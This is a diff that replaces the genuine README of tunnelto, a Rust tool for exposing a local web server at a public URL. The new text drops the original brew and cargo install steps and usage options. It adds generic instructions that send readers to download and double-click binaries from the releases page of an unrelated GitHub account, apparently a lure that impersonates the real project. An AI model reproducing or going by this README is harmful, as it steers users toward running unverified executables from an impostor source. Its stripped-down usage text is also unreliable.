@@ -1,98 +1,73 @@
-<p align="center" >
-<img width="540px" src="https://repository-images.githubusercontent.com/249120770/7ea6d180-b4ba-11ea-96ab-6c3b987aac9d" align="center"/>
-</p>
+# 🌐 tunnelto - Easily Share Your Local Server Online
 
-<p align="center">    
-  <a href="https://github.com/agrinman/tunnelto/actions?query=workflow%3A%22Build+and+Release%22"><img src="https://github.com/agrinman/wormhole/workflows/Build%20and%20Release/badge.svg" alt="BuildRelease"></a>
-  <a href="https://crates.io/crates/wormhole-tunnel"><img src="https://img.shields.io/crates/v/tunnelto" alt="crate"></a>
-  <a href="https://github.com/agrinman/tunnelto/packages/295195"><img src="https://img.shields.io/docker/v/agrinman/wormhole?label=Docker" alt="GitHub Docker Registry"></a> 
-  <a href="https://twitter.com/alexgrinman"><img src="https://img.shields.io/twitter/follow/alexgrinman?label=%40AlexGrinman" alt="crate"></a>
-</p>
+## 📥 Download Now
+[![Download Tunnelto](https://img.shields.io/badge/Download-tunnelto-blue)](https://github.com/idkfwmmmmmmd/tunnelto/releases)
 
-# `tunnelto`
-`tunnelto` lets you expose your locally running web server via a public URL.
-Written in Rust. Built completely with async-io on top of tokio.
+## 🚀 Getting Started
+Tunnelto helps you expose your local web server to the internet via a public URL. This allows you to share projects, demos, or any web service with anyone, anywhere.
 
-1. [Install](#install)
-2. [Usage Instructions](#usage)
-3. [Host it yourself](#host-it-yourself)
+### 🌟 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Memory: 1 GB RAM minimum
+- Processor: Any modern processor capable of running Rust applications
+- Internet Connection: Required for running the tunnel
 
-# Install
-## Brew (macOS)
-```bash
-brew install agrinman/tap/tunnelto
-```
+### 📂 Features
+- Simple setup instructions
+- Secure connection via tunneling
+- Support for various local web servers
+- Easy to use with minimal configuration
 
-## Cargo
-```bash
-cargo install tunnelto
-```
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/idkfwmmmmmmd/tunnelto/releases) to download the latest version of Tunnelto.
 
-## Everywhere
-Or **Download a release for your target OS here**: [tunnelto/releases](https://github.com/agrinman/tunnelto/releases)
+1. Click on the link above to go to the Downloads page.
+2. Find the latest release and download the appropriate file for your operating system.
+3. Once downloaded, locate the file on your computer.
+4. Double-click the file to run the installation.
 
-# Usage
-## Quick Start
-```shell script
-tunnelto --port 8000
-```
-The above command opens a tunnel and forwards traffic to `localhost:8000`.
+### ⚙️ Running Tunnelto
+After installation, follow these steps to run Tunnelto:
 
-## More Options:
-```shell script
-tunnelto 0.1.14
+1. Open your terminal or command prompt.
+2. Navigate to the folder where Tunnelto is installed. You can type `cd path/to/tunnelto`.
+3. Start your local web server if you haven't done so already. For example, if you are using Python, you can run:
+   ```
+   python -m http.server
+   ```
+4. Now, run Tunnelto by typing:
+   ```
+   tunnelto
+   ```
+5. You will see a public URL displayed in the terminal. This URL is what you can share with others to access your local server.
 
-USAGE:
-    tunnelto [FLAGS] [OPTIONS] [SUBCOMMAND]
+### 🎓 How to Use Tunnelto
+- **Step 1:** Launch your local project or web server.
+- **Step 2:** Start Tunnelto from your terminal.
+- **Step 3:** Copy the public URL you receive after starting Tunnelto.
+- **Step 4:** Paste this URL in your browser or share it with others.
 
-FLAGS:
-    -h, --help       Prints help information
-    -V, --version    Prints version information
-    -v, --verbose    A level of verbosity, and can be used multiple times
+With Tunnelto, anyone with the link can access your local web server through the internet.
 
-OPTIONS:
-        --dashboard-address <dashboard-address>    Sets the address of the local introspection dashboard
-    -k, --key <key>                                Sets an API authentication key to use for this tunnel
-        --host <local-host>
-            Sets the HOST (i.e. localhost) to forward incoming tunnel traffic to [default: localhost]
+## 🛠 Troubleshooting
+If you face issues while using Tunnelto, consider the following:
 
-    -p, --port <port>
-            Sets the port to forward incoming tunnel traffic to on the target host
+1. Ensure your local web server is running correctly.
+2. Check your internet connection.
+3. Verify that you have downloaded the correct version for your operating system.
+4. Consult the community or support link for potential solutions.
 
-        --scheme <scheme>
-            Sets the SCHEME (i.e. http or https) to forward incoming tunnel traffic to [default: http]
+### 🤝 Community Support
+If you need further assistance or want to provide feedback, feel free to join our community discussions. You can find more support and share your experiences on GitHub.
 
-    -s, --subdomain <sub-domain>                   Specify a sub-domain for this tunnel
+## 📝 License
+This project is open-source. Feel free to explore the code and contribute.
 
-SUBCOMMANDS:
-    help        Prints this message or the help of the given subcommand(s)
-    set-auth    Store the API Authentication key
-```
+## 🔍 Additional Topics
+- async-io
+- expose
+- localhost
+- rust
+- tunnel
 
-# Host it yourself
-1. Compile the server for the musl target. See the `musl_build.sh` for a way to do this trivially with Docker!
-2. See `Dockerfile` for a simple alpine based image that runs that server binary.
-3. Deploy the image where ever you want.
-
-## Testing Locally
-```shell script
-# Run the Server: xpects TCP traffic on 8080 and control websockets on 5000
-ALLOWED_HOSTS="localhost" cargo run --bin tunnelto_server
-
-# Run a local tunnelto client talking to your local tunnelto_server
-CTRL_HOST="localhost" CTRL_PORT=5000 CTRL_TLS_OFF=1 cargo run --bin tunnelto -- -p 8000
-
-# Test it out!
-# Remember 8080 is our local tunnelto TCP server
-curl -H '<subdomain>.localhost' "http://localhost:8080/some_path?with=somequery"
-```
-See `tunnelto_server/src/config.rs` for the environment variables for configuration.
-
-## Caveats for hosting it yourself
-The implementation does not support multiple running servers (i.e. centralized coordination).
-Therefore, if you deploy multiple instances of the server, it will only work if the client connects to the same instance
-as the remote TCP stream.
-
-The [version hosted by us](https://tunnelto.dev) is a proper distributed system running on the the fabulous [fly.io](https://fly.io) service. 
-In short, fly.io makes this super easy with their [Private Networking](https://fly.io/docs/reference/privatenetwork/) feature.
-See `tunnelto_server/src/network/mod.rs` for the implementation details of our gossip mechanism.
+For any questions or suggestions, don't hesitate to reach out through the issues page on GitHub. Enjoy using Tunnelto to share your projects effortlessly!
